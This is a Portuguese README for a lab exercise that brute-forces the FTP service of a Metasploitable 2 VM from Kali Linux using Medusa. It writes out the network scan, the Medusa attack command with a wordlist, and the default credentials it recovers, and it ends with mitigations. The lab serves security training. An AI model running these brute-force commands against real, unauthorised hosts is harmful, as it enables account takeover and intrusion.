# Projeto: Ataque de Força Bruta com Medusa  

Este projeto demonstra um ataque de **força bruta controlado** em ambiente de laboratório, utilizando o **Kali Linux** e a máquina vulnerável **Metasploitable 2**.  

---

## 🎯 Objetivo
Simular ataques de força bruta contra serviços comuns (como FTP) para compreender vulnerabilidades e testar medidas de mitigação.  

---

## 🧠 Ferramentas utilizadas
- **Kali Linux** — Sistema de testes de penetração  
- **Metasploitable 2** — Ambiente vulnerável para prática  
- **Medusa** — Ferramenta de ataque de força bruta  
- **VirtualBox** — Virtualização e rede interna (Host-Only)

---

## ⚙️ Configuração do ambiente
1. Duas VMs configuradas no VirtualBox:
   - Kali Linux (atacante)  
   - Metasploitable 2 (alvo)  
2. Rede: Host-Only Adapter — comunicação direta entre as VMs  
3. IP da Metasploitable identificado via comando:
   ```bash
   ip a
⚡ Execução

1️⃣ Descobrir o alvo ativo
nmap -sn 192.168.56.0/24

2️⃣ Testar conexão
ping 192.168.56.103

3️⃣ Executar ataque de força bruta com Medusa
medusa -h 192.168.56.103 -u msfadmin -P ~/small-pass.txt -M ftp

4️⃣ Validar acesso bem-sucedido
ftp 192.168.56.103


Usuário: msfadmin
Senha: msfadmin

📊 Resultados

O Medusa identificou corretamente a senha do serviço FTP, demonstrando a importância de evitar senhas fracas ou previsíveis.

🛡️ Medidas de Mitigação

Usar senhas fortes e únicas

Limitar tentativas de login (ex: fail2ban)

Desabilitar serviços desnecessários

Implementar autenticação em múltiplos fatores

📁 Estrutura do Projeto
medusa-forcebrute-lab/
├── README.md
├── commands.txt
├── wordlists/
│   └── small-pass.txt
└── images/


Autor: Roger Silva
Data: Novembro/2025
Uso: Fins educacionais e laboratoriais.
